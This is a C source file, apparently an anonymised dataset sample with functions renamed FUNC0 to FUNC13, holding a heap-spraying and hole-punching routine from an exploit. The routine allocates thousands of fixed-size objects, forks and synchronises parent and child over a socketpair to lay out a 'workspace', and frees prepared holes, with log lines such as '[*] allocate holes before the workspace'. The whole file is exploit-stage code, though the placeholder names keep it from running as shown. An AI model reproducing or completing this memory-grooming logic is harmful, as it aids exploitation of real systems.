#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct flock {int dummy; } ;
typedef  scalar_t__ pid_t ;
typedef  int /*<<< orphan*/  fl ;

/* Variables and functions */
 int /*<<< orphan*/  AF_UNIX ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 size_t FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 scalar_t__ FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 (size_t) ; 
 size_t FUNC5 (size_t,size_t*) ; 
 int /*<<< orphan*/  FUNC6 (struct flock*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int,char*,int) ; 
 int FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*) ; 
 size_t FUNC10 (size_t) ; 
 scalar_t__ FUNC11 (int*) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,int) ; 

int FUNC13(size_t *spray_size) {
	size_t keys[0x400];
	int exec[2];
	int sv[2];
    char flag;

	size_t bytes = 0, tofree = 0;
	size_t factor,hole_size;
	struct flock fl;
	FUNC6(&fl, 0, sizeof(fl));
	pid_t pid, wpid;
	int status;

	if (FUNC9(AF_UNIX, SOCK_STREAM, 0, sv) == -1) {
		FUNC7("[*err] socketpair failed\n");
		return 1;
	}

	bytes = FUNC10(1);
	if (bytes == (size_t)-1) {
		FUNC7("[*err*] bytes < 0, are you root?\n");
		return 1;
	}

	*spray_size = bytes;
	hole_size = FUNC5(*spray_size, &factor);

	tofree = hole_size / (bytes / 1) + 1;

	FUNC7("[*] allocate holes before the workspace\n");
	for (int i = 0; i < 0x400; ++i) {
		keys[i] = FUNC0(0x7000);
	}
	for (int i = 0; i < 0x20; ++i) {
		FUNC0(0x7000);
	}
	for (int i = 0; i < 0x2000; ++i) {
		FUNC0(4063);
	}
	for (int i = 0; i < 0x2000; ++i) {
		FUNC0(3);
	}

	pid = FUNC3();
	if (pid > 0) {
		FUNC7("[*] alloc 0xc pages groups, adjust to continuous allocations\n");
		bytes = FUNC10(5);
		FUNC12(sv[1], "p", 1);
		FUNC8(sv[1], &flag, 1);
	} else {
		// son
		FUNC8(sv[0], &flag, 1);
		FUNC7("[*] alloc workspace pages\n");
		bytes = FUNC10(tofree);
		FUNC7("[*] finish allocate workspace allocations\n");
		FUNC12(sv[0], "p", 1);
	}

	if (pid > 0) {
		FUNC7("[*] allocating (0xc - shm | shm) AFTER the workspace\n");
		for (int i = 0; i < 0x100; ++i) {
			FUNC0(4061);
			for (int j = 0; j < 0x5; ++j) {	
				FUNC1(i * 0x100 + j);
			}
		}
		FUNC12(sv[1], "p", 1);
	} else {
		FUNC8(sv[0], &flag, 1);
		FUNC7("[*] free middle allocation, creating workspace freed\n");
		FUNC2(1);
	}

	while ((wpid = FUNC11(&status)) > 0); 

	FUNC7("[*] free prepared holes, create little pages holes before the workspace\n");
	for (int i = 0; i < 0x400; ++i) {
		FUNC4(keys[i]);
	}
	
	return 0;
}